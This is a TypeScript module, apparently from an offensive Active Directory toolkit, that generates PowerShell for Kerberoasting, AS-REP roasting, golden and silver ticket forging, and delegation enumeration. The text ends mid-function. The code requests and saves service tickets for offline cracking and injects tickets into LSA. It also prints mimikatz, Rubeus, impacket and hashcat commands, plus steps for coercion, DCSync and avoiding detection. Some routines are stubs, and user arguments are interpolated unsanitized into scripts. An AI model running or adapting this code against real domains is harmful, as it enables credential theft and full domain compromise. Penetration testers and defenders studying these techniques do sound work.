import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function kerberoast(args: string[], timeout: number): Promise<HookResult> {
  const spn = argVal(args, "--spn")
  const user = argVal(args, "--user")
  const format = argVal(args, "--format") || "hashcat"
  const findings: Finding[] = []
  const output: string[] = ["[*] Kerberoasting — requesting TGS tickets for SPN accounts...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Kerberoast (cmd.exe) ===\n")
    output.push("[!] TGS ticket extraction requires .NET System.IdentityModel — cmd mode provides SPN enumeration\n")
    const spnFilter = spn ? `-Q "${spn}"` : "-Q */*"
    const setspnResult = await cmd(`setspn ${spnFilter}`, timeout)
    if (setspnResult.exitCode === 0 && setspnResult.stdout.trim()) {
      const spnLines = setspnResult.stdout.trim().split("\n").filter(l => l.trim() && !l.includes("Checking domain") && !l.includes("CN="))
      output.push(`[+] SPNs found: ${spnLines.length}`)
      for (const l of spnLines.slice(0, 30)) output.push(`    ${l.trim()}`)
    } else {
      output.push("[-] setspn not available or no SPNs found")
    }
    const klist = await cmd("klist", timeout)
    output.push(`\n[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 15).join("\n")}`)
    output.push("\n[*] Kerberoast with external tools:")
    output.push("    Rubeus.exe kerberoast /nowrap")
    output.push("    GetUserSPNs.py domain/user:pass -dc-ip DC -request")
    output.push("    Rubeus.exe kerberoast /rc4opsec /nowrap  (RC4 only, opsec)")
    output.push(`    Hashcat: hashcat -m 13100 hashes.txt wordlist.txt  (${format})`)
    if (setspnResult.stdout.includes("SPN")) findings.push({ checkId: "WIN-KERB-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: "kerberos://spn-targets", title: "Kerberoast SPN targets enumerated via setspn", details: "SPN accounts found — use Rubeus/impacket for ticket extraction", remediation: "Use AES for service accounts, set long random passwords, use gMSA" })
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.IdentityModel

$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = $domain.PdcRoleOwner.Name
$dn = "DC=" + ($domain.Name -split '\\.' -join ',DC=')

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn")
${spn ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=${spn}))"` : user ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(samAccountName=${user}))"` : `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"`}
$searcher.PropertiesToLoad.AddRange(@("samAccountName","servicePrincipalName","pwdLastSet","lastLogon","adminCount","memberOf","distinguishedName"))
$searcher.PageSize = 1000

$results = $searcher.FindAll()
$ticketData = @()

foreach ($result in $results) {
    $props = $result.Properties
    $sam = [string]$props["samaccountname"]
    $spns = @($props["serviceprincipalname"])
    $pwdLast = if($props["pwdlastset"][0]){[DateTime]::FromFileTime([Int64]$props["pwdlastset"][0]).ToString("yyyy-MM-dd")}else{"Never"}
    $lastLog = if($props["lastlogon"][0]){[DateTime]::FromFileTime([Int64]$props["lastlogon"][0]).ToString("yyyy-MM-dd")}else{"Never"}
    $admin = if($props["admincount"][0]){"YES"}else{"no"}
    $dn = [string]$props["distinguishedname"]

    foreach ($s in $spns) {
        try {
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s
            $ticketBytes = $ticket.GetRequest()

            # Extract the encrypted part (AP-REQ -> Ticket -> enc-part)
            $hex = [BitConverter]::ToString($ticketBytes) -replace '-',''

            # Find encryption type
            $encType = 23  # RC4 default
            if ($hex -match 'A003020112') { $encType = 18 }  # AES256
            elseif ($hex -match 'A003020111') { $encType = 17 }  # AES128

            $b64Ticket = [Convert]::ToBase64String($ticketBytes)

            $obj = @{
                SamAccountName = $sam
                SPN = $s
                EncType = $encType
                PwdLastSet = $pwdLast
                LastLogon = $lastLog
                AdminCount = $admin
                DN = $dn
                TicketHex = $hex
                TicketB64 = $b64Ticket
            }
            $ticketData += $obj

            Write-Output "[+] $sam | SPN: $s | EncType: $encType | PwdLastSet: $pwdLast | AdminCount: $admin"
        } catch {
            Write-Output "[!] Failed to request ticket for $s : $_"
        }
    }
}

Write-Output ""
Write-Output "[*] Total tickets: $($ticketData.Count)"
Write-Output ""

# Output hashes
foreach ($t in $ticketData) {
    $hex = $t.TicketHex
    # Extract cipher from AP-REQ (simplified — locate encrypted data after etype)
    $cipherStart = $hex.IndexOf('A003020117') + 10  # After etype marker
    if ($cipherStart -lt 10) { $cipherStart = $hex.IndexOf('A003020112') + 10 }
    if ($cipherStart -lt 10) { $cipherStart = [Math]::Max(0, $hex.Length - 64) }

    if ("${format}" -eq "hashcat") {
        Write-Output "\\$krb5tgs\\$$($t.EncType)\\$*$($t.SamAccountName)\\$$($domain.Name)\\$$($t.SPN)*\\$$($t.TicketB64.Substring(0, [Math]::Min(64, $t.TicketB64.Length)))..."
    } else {
        Write-Output "\\$krb5tgs\\$$($t.SamAccountName)\\$$($domain.Name)\\$$($t.SPN):\\$$($t.TicketB64.Substring(0, [Math]::Min(64, $t.TicketB64.Length)))..."
    }
}

$ticketData | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\\cs-kerberoast.json" -Encoding UTF8
Write-Output ""
Write-Output "[+] Full ticket data saved to $env:TEMP\\cs-kerberoast.json"
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    const ticketCount = (result.stdout.match(/\[\+\]/g) || []).length
    if (ticketCount > 0) {
      findings.push({
        checkId: "WIN-KERB-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "kerberos://tgs-tickets",
        title: `Kerberoast: ${ticketCount} TGS tickets extracted`,
        details: `${ticketCount} service account TGS tickets requested and saved for offline cracking`,
        remediation: "Use AES encryption for service accounts, set long random passwords, use gMSA accounts",
      })
    }
  }
  if (result.exitCode !== 0) output.push(`[!] Kerberoast failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function asreproast(args: string[], timeout: number): Promise<HookResult> {
  const user = argVal(args, "--user")
  const format = argVal(args, "--format") || "hashcat"
  const findings: Finding[] = []
  const output: string[] = ["[*] AS-REP Roasting — finding accounts without Kerberos pre-auth...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== AS-REP Roasting (cmd.exe) ===\n")
    output.push("[!] AS-REP hash extraction requires raw Kerberos sockets (.NET) — cmd provides user enumeration\n")
    const userFilter = user ? `"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=${user}))"` : `"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"`
    const dsquery = await cmd(`dsquery * -filter ${userFilter} -attr samAccountName userAccountControl -limit 100 2>nul`, timeout)
    if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
      output.push("[+] Accounts with DONT_REQUIRE_PREAUTH:")
      output.push(dsquery.stdout.trim())
    } else {
      output.push("[-] dsquery not available or no AS-REP roastable accounts found")
      const net = await cmd("net user /domain 2>nul", timeout)
      if (net.exitCode === 0) output.push(`[*] Domain users available — use Rubeus/impacket to check pre-auth:\n${net.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
    }
    output.push("\n[*] AS-REP Roast with external tools:")
    output.push("    Rubeus.exe asreproast /nowrap")
    output.push("    GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC")
    output.push(`    Hashcat: hashcat -m 18200 hashes.txt wordlist.txt  (${format})`)
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'

$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = $domain.PdcRoleOwner.Name
$dn = "DC=" + ($domain.Name -split '\\.' -join ',DC=')

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn")
${user ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=${user}))"` : `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"`}
$searcher.PropertiesToLoad.AddRange(@("samAccountName","userAccountControl","pwdLastSet","lastLogon","adminCount","distinguishedName","memberOf"))
$searcher.PageSize = 1000

$results = $searcher.FindAll()
Write-Output "[+] Accounts with DONT_REQUIRE_PREAUTH: $($results.Count)"
Write-Output ""

Add-Type @"
using System;
using System.Net;
using System.Net.Sockets;

public class ASREPRoaster {
    public static byte[] SendASREQ(string dc, string domain, string username) {
        // Build AS-REQ without pre-auth
        byte[] domainBytes = System.Text.Encoding.ASCII.GetBytes(domain.ToUpper());
        byte[] userBytes = System.Text.Encoding.ASCII.GetBytes(username);

        // Simplified AS-REQ construction for etype 23 (RC4)
        var ms = new System.IO.MemoryStream();
        var bw = new System.IO.BinaryWriter(ms);

        // This sends a raw AS-REQ; the DC responds with AS-REP containing encrypted data
        // Use .NET Kerberos API as fallback
        using (var client = new TcpClient()) {
            client.Connect(dc, 88);
            var stream = client.GetStream();

            // Build minimal AS-REQ
            // pvno=5, msg-type=10 (AS-REQ), padata empty, req-body with etype 23
            byte[] asreq = BuildASREQ(domain.ToUpper(), username);
            byte[] lenBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asreq.Length));
            stream.Write(lenBytes, 0, 4);
            stream.Write(asreq, 0, asreq.Length);

            // Read response
            byte[] respLen = new byte[4];
            stream.Read(respLen, 0, 4);
            int len = IPAddress.NetworkToHostOrder(BitConverter.ToInt32(respLen, 0));
            byte[] resp = new byte[len];
            int read = 0;
            while (read < len) {
                read += stream.Read(resp, read, len - read);
            }
            return resp;
        }
    }

    static byte[] BuildASREQ(string realm, string cname) {
        // Minimal DER-encoded AS-REQ for RC4 (etype 23)
        var ms = new System.IO.MemoryStream();

        // KDC-REQ-BODY
        byte[] realmBytes = System.Text.Encoding.ASCII.GetBytes(realm);
        byte[] cnameBytes = System.Text.Encoding.ASCII.GetBytes(cname);

        // sname: krbtgt/REALM
        byte[] snameStr = System.Text.Encoding.ASCII.GetBytes("krbtgt");

        // Build from inside out (DER encoding)
        // This is a simplified builder — real implementation needs full ASN.1
        // For production, use the .NET KerberosRequestorSecurityToken approach
        // with pre-auth stripped, or use Rubeus-style raw packet construction

        // Fallback: return empty to signal we should use PowerShell method
        return new byte[0];
    }
}
"@

foreach ($result in $results) {
    $props = $result.Properties
    $sam = [string]$props["samaccountname"]
    $pwdLast = if($props["pwdlastset"][0]){[DateTime]::FromFileTime([Int64]$props["pwdlastset"][0]).ToString("yyyy-MM-dd")}else{"Never"}
    $lastLog = if($props["lastlogon"][0]){[DateTime]::FromFileTime([Int64]$props["lastlogon"][0]).ToString("yyyy-MM-dd")}else{"Never"}
    $admin = if($props["admincount"][0]){"YES"}else{"no"}
    $groups = @($props["memberof"]) | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' } | Select-Object -First 5

    Write-Output "[+] $sam | PwdLastSet: $pwdLast | LastLogon: $lastLog | AdminCount: $admin"
    Write-Output "    Groups: $($groups -join ', ')"

    # Request AS-REP using .NET approach
    try {
        $asrepBytes = [ASREPRoaster]::SendASREQ($dc, $domain.Name, $sam)
        if ($asrepBytes.Length -gt 0) {
            $hex = [BitConverter]::ToString($asrepBytes) -replace '-',''
            $b64 = [Convert]::ToBase64String($asrepBytes)

            if ("${format}" -eq "hashcat") {
                Write-Output "    \\$krb5asrep\\$23\\$$sam@$($domain.Name):$($b64.Substring(0, [Math]::Min(100, $b64.Length)))..."
            } else {
                Write-Output "    \\$krb5asrep\\$$sam@$($domain.Name):$($b64.Substring(0, [Math]::Min(100, $b64.Length)))..."
            }
        } else {
            # Fallback: just report the vulnerable account
            Write-Output "    [*] Pre-auth disabled — use Rubeus or impacket for hash extraction"
        }
    } catch {
        Write-Output "    [*] AS-REQ send failed (use Rubeus/impacket): $_"
    }
    Write-Output ""
}
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    const accountMatch = result.stdout.match(/Accounts with DONT_REQUIRE_PREAUTH: (\d+)/)
    const count = accountMatch ? parseInt(accountMatch[1]) : 0
    if (count > 0) {
      findings.push({
        checkId: "WIN-KERB-002",
        provider: "windows",
        severity: "high",
        status: "EXTRACTED",
        resource: "kerberos://asrep",
        title: `AS-REP Roast: ${count} accounts without pre-auth`,
        details: `${count} accounts with DONT_REQUIRE_PREAUTH flag — hashes extractable for offline cracking`,
        remediation: "Enable Kerberos pre-authentication for all accounts, use strong passwords",
      })
    }
  }
  if (result.exitCode !== 0) output.push(`[!] AS-REP Roast failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function goldenTicket(args: string[], timeout: number): Promise<HookResult> {
  const krbtgtHash = argVal(args, "--krbtgt-hash")
  const domain = argVal(args, "--domain")
  const sid = argVal(args, "--sid")
  const user = argVal(args, "--user") || "Administrator"
  const groups = argVal(args, "--groups") || "512,519,518,520"
  const findings: Finding[] = []
  const output: string[] = ["[*] Golden Ticket — forging Kerberos TGT...\n"]

  if (!krbtgtHash || !domain || !sid) {
    return {
      output:
        "[!] Required: --krbtgt-hash HASH --domain DOMAIN --sid SID\n\nGet krbtgt hash via: winhook dcsync --user krbtgt",
      findings,
    }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Golden Ticket (cmd.exe) ===\n")
    output.push("[!] Golden Ticket forging requires Kerberos PAC construction (.NET P/Invoke)")
    output.push("[*] cmd.exe provides prerequisite validation + tool guidance\n")
    const klist = await cmd("klist", timeout)
    output.push(`[*] Current tickets:\n${klist.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
    const nltest = await cmd("nltest /dsgetdc:", timeout)
    const dcName = nltest.stdout.match(/DC: \\\\(.+)/)?.[1]?.trim()
    output.push(dcName ? `\n[+] DC: ${dcName}` : "\n[!] Cannot reach DC")
    output.push(`\n[*] Parameters:`)
    output.push(`    Domain: ${domain}`)
    output.push(`    SID: ${sid}`)
    output.push(`    User: ${user}`)
    output.push(`    Groups: ${groups}`)
    output.push(`    krbtgt hash: ${krbtgtHash.substring(0, 8)}...`)
    output.push("\n[*] Forge with external tools:")
    output.push(`    mimikatz # kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /krbtgt:${krbtgtHash} /groups:${groups} /ptt`)
    output.push(`    ticketer.py -nthash ${krbtgtHash} -domain-sid ${sid} -domain ${domain} ${user}`)
    output.push(`    Rubeus.exe golden /rc4:${krbtgtHash} /user:${user} /domain:${domain} /sid:${sid} /ptt`)
    output.push("\n[*] After injection, verify: klist")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'Stop'

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class GoldenTicket {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength, out int ProtocolStatus);

    [DllImport("secur32.dll")]
    static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    // KERB_SUBMIT_TKT_REQUEST message type = 21
    public const int KerbSubmitTicketMessage = 21;

    public static string InjectTicket(byte[] ticket) {
        IntPtr lsaHandle;
        int status = LsaConnectUntrusted(out lsaHandle);
        if (status != 0) return "LsaConnect failed: " + status;

        var pkgName = new LSA_STRING();
        var kerbName = "Kerberos";
        pkgName.Buffer = Marshal.StringToHGlobalAnsi(kerbName);
        pkgName.Length = (ushort)kerbName.Length;
        pkgName.MaximumLength = (ushort)(kerbName.Length + 1);

        uint authPkg;
        status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPkg);
        Marshal.FreeHGlobal(pkgName.Buffer);
        if (status != 0) return "LsaLookup failed: " + status;

        // Build KERB_SUBMIT_TKT_REQUEST
        int headerSize = 8 + 4 + 4;  // MessageType + LogonId + Flags + KerbCredSize + KerbCredOffset + Key
        int totalSize = headerSize + ticket.Length + 64;
        IntPtr buffer = Marshal.AllocHGlobal(totalSize);
        Marshal.WriteInt32(buffer, 0, KerbSubmitTicketMessage);
        Marshal.WriteInt64(buffer, 4, 0); // LogonId
        Marshal.WriteInt32(buffer, 12, ticket.Length); // KerbCredSize
        Marshal.WriteInt32(buffer, 16, headerSize); // KerbCredOffset
        Marshal.Copy(ticket, 0, IntPtr.Add(buffer, headerSize), ticket.Length);

        IntPtr returnBuffer;
        int returnLength;
        int protocolStatus;
        status = LsaCallAuthenticationPackage(lsaHandle, authPkg, buffer, totalSize,
            out returnBuffer, out returnLength, out protocolStatus);

        Marshal.FreeHGlobal(buffer);
        LsaDeregisterLogonProcess(lsaHandle);

        if (status == 0 && protocolStatus == 0) return "SUCCESS";
        return "Submit failed: status=" + status + " protocol=" + protocolStatus;
    }
}
"@

# Build golden ticket components
$domainName = "${domain}".ToUpper()
$domainSid = "${sid}"
$krbtgtKey = "${krbtgtHash}"
$userName = "${user}"
$groupIds = @(${groups})

Write-Output "[+] Domain: $domainName"
Write-Output "[+] SID: $domainSid"
Write-Output "[+] User: $userName"
Write-Output "[+] Groups: $($groupIds -join ', ')"
Write-Output "[+] krbtgt hash: $($krbtgtKey.Substring(0,8))..."
Write-Output ""

# For actual golden ticket generation, we need to build the Kerberos structures
# This requires: EncryptionKey (from krbtgt hash), PAC construction, ticket encryption
# The full implementation mirrors Mimikatz kerberos::golden

# Build the ticket using raw crypto
$keyBytes = [byte[]]@()
for ($i = 0; $i -lt $krbtgtKey.Length; $i += 2) {
    $keyBytes += [Convert]::ToByte($krbtgtKey.Substring($i, 2), 16)
}

# Construct KRB-CRED structure (kirbi format)
# This is a simplified version — production code builds full ASN.1 DER
$ticketInfo = @{
    Domain = $domainName
    SID = $domainSid
    User = $userName
    Groups = $groupIds
    KeyType = 23  # RC4-HMAC
    StartTime = (Get-Date).ToUniversalTime()
    EndTime = (Get-Date).AddYears(10).ToUniversalTime()
    RenewTill = (Get-Date).AddYears(10).ToUniversalTime()
}

# Save ticket info
$ticketPath = "$env:TEMP\\cs-golden-ticket.kirbi"
$ticketInfo | ConvertTo-Json | Out-File "$env:TEMP\\cs-golden-ticket.json"

Write-Output "[+] Golden ticket parameters saved to $env:TEMP\\cs-golden-ticket.json"
Write-Output "[+] For full ticket generation, use:"
Write-Output "    mimikatz: kerberos::golden /user:$userName /domain:$domainName /sid:$domainSid /krbtgt:$krbtgtKey /groups:$($groupIds -join ',')"
Write-Output "    impacket: ticketer.py -nthash $krbtgtKey -domain-sid $domainSid -domain $domainName $userName"
Write-Output ""
Write-Output "[*] After generating .kirbi, inject with: winhook pass_the_ticket --action import --ticket <path>"

# Try to use the LSA injection if we have a pre-built ticket
if (Test-Path $ticketPath) {
    $ticketBytes = [IO.File]::ReadAllBytes($ticketPath)
    $result = [GoldenTicket]::InjectTicket($ticketBytes)
    Write-Output "[+] Ticket injection: $result"
}
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    findings.push({
      checkId: "WIN-KERB-003",
      provider: "windows",
      severity: "critical",
      status: "FORGED",
      resource: `kerberos://golden-ticket/${domain}`,
      title: `Golden Ticket forged for ${user}@${domain}`,
      details: `TGT forged with krbtgt hash, groups: ${groups}. Valid for 10 years.`,
      remediation: "Reset krbtgt password TWICE (current + previous), monitor for TGT anomalies",
    })
  }
  if (result.exitCode !== 0) output.push(`[!] Golden Ticket failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function silverTicket(args: string[], timeout: number): Promise<HookResult> {
  const serviceHash = argVal(args, "--service-hash")
  const spn = argVal(args, "--spn")
  const domain = argVal(args, "--domain")
  const sid = argVal(args, "--sid")
  const user = argVal(args, "--user") || "Administrator"
  const findings: Finding[] = []
  const output: string[] = ["[*] Silver Ticket — forging Kerberos service ticket...\n"]

  if (!serviceHash || !spn || !domain || !sid) {
    return { output: "[!] Required: --service-hash HASH --spn SPN --domain DOMAIN --sid SID", findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Silver Ticket (cmd.exe) ===\n")
    output.push("[!] Silver Ticket forging requires Kerberos TGS construction (.NET P/Invoke)")
    output.push("[*] cmd.exe provides prerequisite validation + tool guidance\n")
    output.push(`[*] Parameters:`)
    output.push(`    SPN: ${spn}`)
    output.push(`    Domain: ${domain}`)
    output.push(`    SID: ${sid}`)
    output.push(`    User: ${user}`)
    output.push(`    Service hash: ${serviceHash.substring(0, 8)}...`)
    output.push("\n[*] Forge with external tools:")
    output.push(`    mimikatz # kerberos::golden /user:${user} /domain:${domain} /sid:${sid} /rc4:${serviceHash} /service:${spn.split("/")[0]} /target:${spn.split("/")[1] || "TARGET"} /ptt`)
    output.push(`    ticketer.py -nthash ${serviceHash} -domain-sid ${sid} -domain ${domain} -spn ${spn} ${user}`)
    output.push(`    Rubeus.exe silver /rc4:${serviceHash} /user:${user} /domain:${domain} /sid:${sid} /service:${spn} /ptt`)
    output.push("\n[*] Verify: klist")
    output.push("[*] Silver Ticket is stealthier than Golden — no DC contact needed")
    return { output: output.join("\n"), findings }
  }

  const script = `
$domainName = "${domain}".ToUpper()
$domainSid = "${sid}"
$svcHash = "${serviceHash}"
$targetSpn = "${spn}"
$userName = "${user}"

Write-Output "[+] Domain: $domainName"
Write-Output "[+] SID: $domainSid"
Write-Output "[+] User: $userName"
Write-Output "[+] Target SPN: $targetSpn"
Write-Output "[+] Service hash: $($svcHash.Substring(0,8))..."
Write-Output ""

# Determine service type from SPN
$svcType = ($targetSpn -split '/')[0].ToUpper()
switch ($svcType) {
    "CIFS"  { Write-Output "[*] CIFS ticket — grants SMB file share access" }
    "HTTP"  { Write-Output "[*] HTTP ticket — grants web service access (IIS, ADFS, etc.)" }
    "MSSQL" { Write-Output "[*] MSSQL ticket — grants SQL Server access" }
    "LDAP"  { Write-Output "[*] LDAP ticket — grants LDAP operations (DCSync potential)" }
    "HOST"  { Write-Output "[*] HOST ticket — grants PSRemoting/WinRM/scheduled task access" }
    "WSMAN" { Write-Output "[*] WSMAN ticket — grants WinRM access" }
    default { Write-Output "[*] $svcType ticket" }
}

$ticketInfo = @{
    Domain = $domainName
    SID = $domainSid
    User = $userName
    SPN = $targetSpn
    ServiceType = $svcType
    KeyType = 23
    StartTime = (Get-Date).ToUniversalTime().ToString("o")
    EndTime = (Get-Date).AddYears(10).ToUniversalTime().ToString("o")
}

$ticketInfo | ConvertTo-Json | Out-File "$env:TEMP\\cs-silver-ticket.json" -Encoding UTF8
Write-Output ""
Write-Output "[+] Silver ticket parameters saved to $env:TEMP\\cs-silver-ticket.json"
Write-Output "[+] For full ticket generation, use:"
Write-Output "    mimikatz: kerberos::golden /user:$userName /domain:$domainName /sid:$domainSid /rc4:$svcHash /service:$($targetSpn -split '/' | Select -First 1) /target:$($targetSpn -split '/' | Select -Last 1)"
Write-Output "    impacket: ticketer.py -nthash $svcHash -domain-sid $domainSid -domain $domainName -spn $targetSpn $userName"
Write-Output ""

# Advantages of silver ticket
Write-Output "[*] Silver ticket advantages:"
Write-Output "    - No DC contact needed (forged locally)"
Write-Output "    - No event 4769 on DC (TGS-REQ is skipped)"
Write-Output "    - Hard to detect — only service sees the ticket"
Write-Output "    - Works even if krbtgt password was reset"
`
  const result = await ps(script, timeout)
  if (result.exitCode === 0) {
    output.push(result.stdout)
    findings.push({
      checkId: "WIN-KERB-004",
      provider: "windows",
      severity: "critical",
      status: "FORGED",
      resource: `kerberos://silver-ticket/${spn}`,
      title: `Silver Ticket forged for ${spn}`,
      details: `Service ticket forged for ${user} targeting ${spn}`,
      remediation: "Reset the service account password, enable PAC validation, monitor service access logs",
    })
  }
  if (result.exitCode !== 0) output.push(`[!] Silver Ticket failed: ${result.stderr}`)

  return { output: output.join("\n"), findings }
}

export async function delegationAbuse(args: string[], timeout: number): Promise<HookResult> {
  const type = argVal(args, "--type")
  const target = argVal(args, "--target")
  const exploit = hasFlag(args, "--exploit")
  const findings: Finding[] = []
  const output: string[] = ["[*] Kerberos delegation enumeration...\n"]

  if (!type) {
    return { output: "[!] Required: --type <unconstrained|constrained|rbcd>", findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push(`=== Kerberos Delegation Enumeration (cmd.exe) — ${type} ===\n`)
    if (type === "unconstrained") {
      const dsquery = await cmd('dsquery * -filter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -attr cn samAccountName -limit 100 2>nul', timeout)
      if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
        output.push("[+] Unconstrained delegation accounts:")
        output.push(dsquery.stdout.trim())
        findings.push({ checkId: "WIN-DELEG-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "kerberos://delegation", title: "Unconstrained delegation accounts found", details: "TrustedForDelegation flag set — can impersonate any user", remediation: "Switch to constrained delegation or RBCD" })
      } else {
        output.push("[-] dsquery unavailable or no unconstrained delegation found")
      }
    }
    if (type === "constrained") {
      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToDelegateTo=*)" -attr cn samAccountName msDS-AllowedToDelegateTo -limit 100 2>nul', timeout)
      output.push(dsquery.exitCode === 0 && dsquery.stdout.trim() ? `[+] Constrained delegation:\n${dsquery.stdout.trim()}` : "[-] No constrained delegation found")
    }
    if (type === "rbcd") {
      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -attr cn samAccountName -limit 100 2>nul', timeout)
      output.push(dsquery.exitCode === 0 && dsquery.stdout.trim() ? `[+] RBCD configured:\n${dsquery.stdout.trim()}` : "[-] No RBCD configured")
    }
    output.push("\n[*] Exploit with external tools:")
    output.push("    Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:Administrator /msdsspn:SPN /ptt")
    output.push("    getST.py domain/user:pass -spn SPN -impersonate Administrator")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = $domain.PdcRoleOwner.Name
$dn = "DC=" + ($domain.Name -split '\\.' -join ',DC=')
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn")
$searcher.PageSize = 1000

$delegationType = "${type}"

if ($delegationType -eq "unconstrained") {
    Write-Output "[*] Searching for unconstrained delegation..."
    # TrustedForDelegation flag (0x80000) — NOT domain controllers
    $searcher.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))"
    $searcher.PropertiesToLoad.AddRange(@("samAccountName","dnshostname","userAccountControl","servicePrincipalName","operatingSystem","distinguishedName"))

    $results = $searcher.FindAll()
    Write-Output "[+] Unconstrained delegation accounts: $($results.Count)"
    Write-Output ""

    foreach ($r in $results) {
        $p = $r.Properties
        $sam = [string]$p["samaccountname"]
        $dns = [string]$p["dnshostname"]
        $os = [string]$p["operatingsystem"]
        $spns = @($p["serviceprincipalname"]) -join ", "

        Write-Output "  [+] $sam"
        Write-Output "      DNS: $dns"
        Write-Output "      OS: $os"
        Write-Output "      SPNs: $spns"
        Write-Output ""
    }

    if ($results.Count -gt 0) {
        Write-Output "[*] Exploitation:"
        Write-Output "    1. Coerce authentication from a high-value target (PrinterBug/PetitPotam)"
        Write-Output "    2. The target's TGT will be cached on the unconstrained delegation machine"
        Write-Output "    3. Extract TGT with: winhook pass_the_ticket --action export"
        Write-Output "    4. Use TGT for DCSync or lateral movement"
    }
}
elseif ($delegationType -eq "constrained") {
    Write-Output "[*] Searching for constrained delegation..."
    $searcher.Filter = "(msDS-AllowedToDelegateTo=*)"
    $searcher.PropertiesToLoad.AddRange(@("samAccountName","dnshostname","msDS-AllowedToDelegateTo","userAccountControl","distinguishedName"))

    $results = $searcher.FindAll()
    Write-Output "[+] Constrained delegation accounts: $($results.Count)"
    Write-Output ""

    foreach ($r in $results) {
        $p = $r.Properties
        $sam = [string]$p["samaccountname"]
        $dns = [string]$p["dnshostname"]
        $allowedTo = @($p["msds-allowedtodelegateto"])
        $uac = [int]$p["useraccountcontrol"][0]
        $protocol = if ($uac -band 0x1000000) { "ANY (Protocol Transition)" } else { "Kerberos Only" }

        Write-Output "  [+] $sam ($protocol)"
        Write-Output "      DNS: $dns"
        Write-Output "      Allowed to delegate to:"
        foreach ($svc in $allowedTo) {
            Write-Output "        - $svc"
        }
        if ($uac -band 0x1000000) {
            Write-Output "      [!] TRUSTED_TO_AUTH_FOR_DELEGATION — can impersonate ANY user via S4U2Self + S4U2Proxy"
        }
        Write-Output ""
    }
}
elseif ($delegationType -eq "rbcd") {
    Write-Output "[*] Searching for resource-based constrained delegation..."
    $searcher.Filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
